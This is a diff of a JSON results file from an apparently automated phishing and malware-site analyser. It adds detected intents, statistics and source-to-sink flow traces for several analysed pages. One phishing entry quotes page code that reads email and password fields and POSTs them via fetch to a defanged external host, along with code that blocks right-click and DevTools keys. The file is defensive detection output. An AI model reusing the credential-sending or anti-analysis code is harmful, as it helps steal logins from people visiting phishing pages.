+    ]
    }
   ],
   "findings_total": 5,
@@ -2975,7 +3426,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -3015,7 +3469,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 8.0,
+     "page_text_chars": 240.0,
+     "language_confidence": 0.9698,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -3040,7 +3504,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_access",
+      "display": "Credential access",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 2,
+      "cues": [],
+      "example": "Page code reads 2 credential field value(s) (#u, #p)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 3.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 3.0,
+     "sinks_total": 2.0,
+     "flows_total": 2.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 3.0
+    }
    }
   },
   "explanation": {
@@ -3120,24 +3606,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 3.4,
-   "quality": 2.0,
-   "dom_features": 2.1,
-   "dom_model": 50.6,
-   "content": 2.8,
-   "text_models": 76.8,
-   "js_analysis": 2.8,
-   "behavior": 2.8,
-   "behavior_model": 32.6,
+   "preprocess": 2.4,
+   "quality": 1.3,
+   "dom_features": 1.1,
+   "dom_model": 33.5,
+   "content": 2.0,
+   "text_models": 74.0,
+   "js_analysis": 2.0,
+   "behavior": 2.2,
+   "behavior_model": 34.3,
    "fusion": 0.1,
-   "total": 177.0
+   "total": 155.2
   }
  },
  "56": {
-  "analysis_id": "2508e5e6a26841f880f93bc14c09525c",
+  "analysis_id": "2ab2c2930740474caa0aa2010344a66a",
   "request_id": "c2_phishing_000012",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:10.643640+05:30",
+  "analyzed_at": "2026-10-21T08:26:19.290049+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -3171,7 +3657,38 @@
     "detail": "Sends credentials (#email, #password) to swjutq[.]org (fetch, line 424).",
     "evidence": "document.getElementById('password').value",
     "raises_verdict": true,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 386,
+      "code": "document.getElementById('password').value",
+      "note": "source: #password = password field"
+     },
+     {
+      "kind": "flow_step",
+      "line": 386,
+      "code": "password = document.getElementById('password').value",
+      "note": "assign: password"
+     },
+     {
+      "kind": "flow_step",
+      "line": 417,
+      "code": "formData.append('password', password)",
+      "note": "assign: formData.append()"
+     },
+     {
+      "kind": "flow_step",
+      "line": 424,
+      "code": "fetch('hxxps://id[.]swjutq[.]org/webapp/owaa.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-u...",
+      "note": "sink: fetch -› swjutq[.]org (external)"
+     },
+     {
+      "kind": "source",
+      "line": 385,
+      "code": "document.getElementById('email').value",
+      "note": "also sent: #email = email field"
+     }
+    ]
    },
    {
     "id": "fusion.verdict",
@@ -3191,7 +3708,26 @@
     "detail": "Anti-analysis (3 techniques): right-click blocked, text selection blocked, DevTools keys blocked.",
     "evidence": "document.addEventListener('contextmenu', function(event) { event.preventDefault(); event.stopPropagation(); return false",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "detection",
+      "line": 168,
+      "code": "document.addEventListener('contextmenu', function(event) { event.preventDefault(); event.stopPropagation(); return false",
+      "note": "contextmenu_listener"
+     },
+     {
+      "kind": "detection",
+      "line": 175,
+      "code": "document.addEventListener('dragstart', function(event) { event.preventDefault(); return false; })",
+      "note": "selection"
+     },
+     {
+      "kind": "detection",
+      "line": 158,
+      "code": "function(event) { const keyCode = event.keyCode || event.which; if (keyCode === 123 || (event.ctrlKey && event.shiftK...",
+      "note": "F12, Ctrl+Shift+I/J/C"
+     }
+    ]
    },
    {
     "id": "dom.form_action_empty_or_js",
@@ -3241,7 +3777,32 @@
     "detail": "Page code reads 4 credential field value(s) (#password, #email).",
     "evidence": "passwordField.value",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "source",
+      "line": 298,
+      "code": "passwordField.value",
+      "note": "credential_input: #password = password field"
+     },
+     {
+      "kind": "source",
+      "line": 385,
+      "code": "document.getElementById('email').value",
+      "note": "credential_input: #email = email field"
+     },
+     {
+      "kind": "source",
+      "line": 386,
+      "code": "document.getElementById('password').value",
+      "note": "credential_input: #password = password field"
+     },
+     {
+      "kind": "source",
+      "line": 508,
+      "code": "$('#email').val()",
+      "note": "credential_input: #email = email field"
+     }
+    ]
    },
    {
     "id": "behavior.external_data_transmission.low_sensitivity",
@@ -3251,7 +3812,56 @@
     "detail": "Sends input values (#login_attempt, #passwordText, #domain ...) to swjutq[.]org (fetch, line 424).",
     "evidence": "document.getElementById('passwordText').value",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 388,
+      "code": "document.getElementById('passwordText').value",
+      "note": "source: #passwordText = not a credential field"
+     },
+     {
+      "kind": "flow_step",
+      "line": 388,
+      "code": "passwordText = document.getElementById('passwordText').value",
+      "note": "assign: passwordText"
+     },
+     {
+      "kind": "flow_step",
+      "line": 392,
+      "code": "password = passwordText",
+      "note": "assign: password"
+     },
+     {
+      "kind": "flow_step",
+      "line": 417,
+      "code": "formData.append('password', password)",
+      "note": "assign: formData.append()"
+     },
+     {
+      "kind": "flow_step",
+      "line": 424,
+      "code": "fetch('hxxps://id[.]swjutq[.]org/webapp/owaa.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-u...",
+      "note": "sink: fetch -› swjutq[.]org (external)"
+     },
+     {
+      "kind": "source",
+      "line": 283,
+      "code": "document.getElementById('login_attempt')?.value",
+      "note": "also sent: #login_attempt = not a credential field"
+     },
+     {
+      "kind": "source",
+      "line": 418,
+      "code": "document.getElementById('domain').value",
+      "note": "also sent: #domain = not a credential field"
+     },
+     {
+      "kind": "source",
+      "line": 419,
+      "code": "document.getElementById('fieldName').value",
+      "note": "also sent: #fieldName = not a credential field"
+     }
+    ]
    }
   ],
   "findings_total": 9,
@@ -3282,7 +3892,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -3322,7 +3935,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 6.0,
+     "page_text_chars": 101.0,
+     "language_confidence": 0.9799,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -3349,7 +3972,56 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_exfiltration",
+      "display": "Credential exfiltration",
+      "method": "ast_source_sink",
+      "severity": "critical",
+      "count": 2,
+      "cues": [],
+      "example": "Sends credentials (#email, #password) to swjutq[.]org (fetch, line 424)."
+     },
+     {
+      "intent": "anti_analysis",
+      "display": "Anti-analysis",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 3,
+      "cues": [],
+      "example": "Anti-analysis (3 techniques): right-click blocked, text selection blocked, DevTools keys blocked."
+     },
+     {
+      "intent": "credential_access",
+      "display": "Credential access",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 4,
+      "cues": [],
+      "example": "Page code reads 4 credential field value(s) (#password, #email)."
+     },
+     {
+      "intent": "external_data_transmission",
+      "display": "External data transmission",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 4,
+      "cues": [],
+      "example": "Sends input values (#login_attempt, #passwordText, #domain ...) to swjutq[.]org (fetch, line 424)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 5.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 24.0,
+     "sinks_total": 4.0,
+     "flows_total": 7.0,
+     "flows_external": 6.0,
+     "behavior_risk_score": 66.0
+    }
    }
   },
   "explanation": {
@@ -3431,24 +4103,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 2.6,
+   "preprocess": 2.5,
    "quality": 1.8,
    "dom_features": 1.3,
-   "dom_model": 20.2,
+   "dom_model": 22.3,
    "content": 1.6,
-   "text_models": 41.5,
-   "js_analysis": 18.8,
-   "behavior": 32.5,
-   "behavior_model": 28.8,
+   "text_models": 35.6,
+   "js_analysis": 14.1,
+   "behavior": 30.2,
+   "behavior_model": 32.1,
    "fusion": 0.1,
-   "total": 150.1
+   "total": 144.1
   }
  },
  "55": {
-  "analysis_id": "edb827751ccc49deb70953206e42d4b9",
+  "analysis_id": "f42494820d094bf6a279431e6be850fa",
   "request_id": "c2_malware_delivery_000087",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:10.480253+05:30",
+  "analyzed_at": "2026-10-21T08:26:19.131869+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -3519,7 +4191,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -3559,7 +4234,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 7.0,
+     "page_text_chars": 196.0,
+     "language_confidence": 0.6599,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -3582,7 +4267,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 6.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 10.0,
+     "sinks_total": 5.0,
+     "flows_total": 1.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -3662,24 +4359,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 6.6,
-   "quality": 6.3,
-   "dom_features": 4.2,
-   "dom_model": 32.6,
-   "content": 3.4,
-   "text_models": 63.0,
-   "js_analysis": 230.1,
-   "behavior": 1871.2,
-   "behavior_model": 22.4,
+   "preprocess": 5.2,
+   "quality": 5.1,
+   "dom_features": 3.0,
+   "dom_model": 34.9,
+   "content": 3.6,
+   "text_models": 61.3,
+   "js_analysis": 225.2,
+   "behavior": 1954.0,
+   "behavior_model": 22.7,
    "fusion": 0.1,
-   "total": 2240.6
+   "total": 2317.8
   }
  },
  "54": {
-  "analysis_id": "676a8558130b40eeabad77db257cdd5c",
+  "analysis_id": "cd22dd00f78b4c8ead707c187466e6f5",
   "request_id": "c2_malware_delivery_000052",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:08.216584+05:30",
+  "analyzed_at": "2026-10-21T08:26:16.797320+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -3740,7 +4437,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -3778,7 +4478,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 13.0,
+     "page_text_chars": 1122.0,
+     "language_confidence": 1.0,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -3801,7 +4511,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 1.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -3883,24 +4605,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 3.6,
-   "quality": 1.8,
+   "preprocess": 5.3,
+   "quality": 2.7,
    "dom_features": 1.7,
-   "dom_model": 30.2,
-   "content": 5.0,
-   "text_models": 214.0,
-   "js_analysis": 1.0,
-   "behavior": 0.9,
-   "behavior_model": 32.4,
+   "dom_model": 30.4,
+   "content": 5.2,
+   "text_models": 214.4,
+   "js_analysis": 1.2,
+   "behavior": 1.0,
+   "behavior_model": 33.4,
    "fusion": 0.1,
-   "total": 291.3
+   "total": 300.3
   }
  },
  "53": {
-  "analysis_id": "73ec54180d254369853f574def451645",
+  "analysis_id": "138e5766679b4f419a9c263b9f00ce64",
   "request_id": "c2_malware_delivery_000050",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:07.908192+05:30",
+  "analyzed_at": "2026-10-21T08:26:16.480238+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -3994,7 +4716,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -4034,7 +4759,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 6.0,
+     "page_text_chars": 99.0,
+     "language_confidence": 1.0,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.1818
+    }
    },
    "behavior": {
     "status": "ok",
@@ -4057,7 +4792,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -4137,24 +4884,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 1.6,
+   "preprocess": 1.7,
    "quality": 0.9,
    "dom_features": 0.8,
-   "dom_model": 21.0,
+   "dom_model": 22.5,
    "content": 1.1,
-   "text_models": 45.9,
+   "text_models": 48.6,
    "js_analysis": 0.2,
    "behavior": 0.3,
-   "behavior_model": 32.5,
+   "behavior_model": 39.6,
    "fusion": 0.1,
-   "total": 105.0
+   "total": 117.9
   }
  },
  "52": {
-  "analysis_id": "d4d3f78846044297bd59ff9bef23d32d",
+  "analysis_id": "13da69c8d5134aae9ceab6f7be1f96d6",
   "request_id": "c2_malware_delivery_000048",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:07.790486+05:30",
+  "analyzed_at": "2026-10-21T08:26:16.348331+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -4235,7 +4982,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -4276,7 +5026,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 4.0,
+     "page_text_chars": 239.0,
+     "language_confidence": 0.8155,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -4299,7 +5059,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -4379,24 +5151,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 2.7,
-   "quality": 1.4,
-   "dom_features": 1.1,
-   "dom_model": 50.6,
-   "content": 2.1,
-   "text_models": 72.4,
+   "preprocess": 2.9,
+   "quality": 1.6,
+   "dom_features": 1.2,
+   "dom_model": 39.2,
+   "content": 1.5,
+   "text_models": 68.5,
    "js_analysis": 0.2,
    "behavior": 0.3,
-   "behavior_model": 226.8,
+   "behavior_model": 218.2,
    "fusion": 0.1,
-   "total": 358.3
+   "total": 336.0
   }
  },
  "51": {
-  "analysis_id": "a913065cf26d414ca68e80746d154298",
+  "analysis_id": "cde62ae99be24126995d4d47ad37611a",
   "request_id": "c2_malware_delivery_000045",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:07.410177+05:30",
+  "analyzed_at": "2026-10-21T08:26:15.988130+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -4479,7 +5251,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -4519,7 +5294,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 8.0,
+     "page_text_chars": 324.0,
+     "language_confidence": 0.9442,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -4542,7 +5327,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -4622,24 +5419,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 3.8,
-   "quality": 2.2,
-   "dom_features": 1.7,
-   "dom_model": 38.1,
-   "content": 2.4,
-   "text_models": 103.1,
-   "js_analysis": 0.2,
-   "behavior": 0.3,
-   "behavior_model": 32.4,
+   "preprocess": 2.6,
+   "quality": 1.4,
+   "dom_features": 1.2,
+   "dom_model": 34.3,
+   "content": 2.7,
+   "text_models": 97.3,
+   "js_analysis": 0.1,
+   "behavior": 0.2,
+   "behavior_model": 33.6,
    "fusion": 0.1,
-   "total": 185.1
+   "total": 176.2
   }
  },
  "50": {
-  "analysis_id": "026b747a075c45fd85045b5c70960ad8",
+  "analysis_id": "f2dee04c8ccf45daa4c429b13c0290c9",
   "request_id": "c2_malware_delivery_000042",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:07.203106+05:30",
+  "analyzed_at": "2026-10-21T08:26:15.793906+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -4700,7 +5497,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -4738,7 +5538,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 85.0,
+     "page_text_chars": 2969.0,
+     "language_confidence": 0.791,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -4761,7 +5571,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 13.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 3.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -4841,24 +5663,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 24.7,
-   "quality": 15.1,
-   "dom_features": 11.5,
-   "dom_model": 31.9,
-   "content": 28.4,
-   "text_models": 370.1,
-   "js_analysis": 13.5,
-   "behavior": 14.3,
-   "behavior_model": 34.0,
+   "preprocess": 22.2,
+   "quality": 15.4,
+   "dom_features": 14.6,
+   "dom_model": 33.7,
+   "content": 23.3,
+   "text_models": 378.0,
+   "js_analysis": 11.0,
+   "behavior": 13.9,
+   "behavior_model": 35.0,
    "fusion": 0.1,
-   "total": 544.5
+   "total": 557.3
   }
  },
  "49": {
-  "analysis_id": "a5426816b25a49f6b63cdcb114aedd7f",
+  "analysis_id": "7c454531570242e980d12ae5d907d715",
   "request_id": "c2_malware_delivery_000036",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:06.636992+05:30",
+  "analyzed_at": "2026-10-21T08:26:15.219917+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -4929,7 +5751,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -4969,7 +5794,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 154.0,
+     "page_text_chars": 2997.0,
+     "language_confidence": 0.7821,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -4992,7 +5827,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 11.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 4.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -5072,24 +5919,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 56.7,
-   "quality": 23.2,
-   "dom_features": 23.1,
-   "dom_model": 31.6,
-   "content": 36.5,
-   "text_models": 350.7,
-   "js_analysis": 13.3,
-   "behavior": 5.0,
-   "behavior_model": 30.1,
+   "preprocess": 38.9,
+   "quality": 26.5,
+   "dom_features": 22.6,
+   "dom_model": 29.1,
+   "content": 40.0,
+   "text_models": 369.1,
+   "js_analysis": 12.6,
+   "behavior": 6.9,
+   "behavior_model": 30.8,
    "fusion": 0.1,
-   "total": 572.0
+   "total": 607.0
   }
  },
  "48": {
-  "analysis_id": "cf248ae0733d41d68091f036d6149055",
+  "analysis_id": "bf9fc0f0d31347acafd9c39ae9ccc382",
   "request_id": "c2_malware_delivery_000023",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:06.042563+05:30",
+  "analyzed_at": "2026-10-21T08:26:14.597764+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -5172,7 +6019,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -5212,7 +6062,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 14.0,
+     "page_text_chars": 582.0,
+     "language_confidence": 0.7605,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -5235,7 +6095,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 2.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 1.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -5315,24 +6187,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 5.1,
-   "quality": 3.3,
-   "dom_features": 2.7,
-   "dom_model": 52.4,
-   "content": 4.9,
-   "text_models": 142.7,
-   "js_analysis": 5.4,
-   "behavior": 3.9,
-   "behavior_model": 29.2,
+   "preprocess": 4.7,
+   "quality": 3.0,
+   "dom_features": 2.4,
+   "dom_model": 40.4,
+   "content": 3.5,
+   "text_models": 134.6,
+   "js_analysis": 4.3,
+   "behavior": 5.1,
+   "behavior_model": 34.5,
    "fusion": 0.1,
-   "total": 250.6
+   "total": 236.0
   }
  },
  "47": {
-  "analysis_id": "2cc710e9d6fa4c5d999f5a9eddccb0d7",
+  "analysis_id": "85877cd1b7164931b3944658af5aeb8a",
   "request_id": "c2_malware_delivery_000018",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:05.768619+05:30",
+  "analyzed_at": "2026-10-21T08:26:14.341251+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -5416,7 +6288,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -5454,7 +6329,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 68.0,
+     "page_text_chars": 2993.0,
+     "language_confidence": 0.8955,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -5477,7 +6362,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 8.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -5557,24 +6454,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 64.0,
-   "quality": 29.3,
-   "dom_features": 27.9,
-   "dom_model": 22.9,
-   "content": 26.3,
-   "text_models": 355.1,
-   "js_analysis": 11.4,
-   "behavior": 4.1,
-   "behavior_model": 34.1,
+   "preprocess": 41.5,
+   "quality": 32.1,
+   "dom_features": 21.7,
+   "dom_model": 23.0,
+   "content": 28.0,
+   "text_models": 385.2,
+   "js_analysis": 11.7,
+   "behavior": 4.8,
+   "behavior_model": 28.8,
    "fusion": 0.1,
-   "total": 577.0
+   "total": 590.9
   }
  },
  "46": {
-  "analysis_id": "956de96bab85489898ebf75d8aa36c75",
+  "analysis_id": "bf9279b0557143bfa2e82e963fac1fce",
   "request_id": "c2_fake_ecommerce_000051",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:05.167102+05:30",
+  "analyzed_at": "2026-10-21T08:26:13.725408+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -5668,7 +6565,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -5708,7 +6608,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 94.0,
+     "page_text_chars": 2995.0,
+     "language_confidence": 0.7437,
+     "si_script_ratio": 0.0,
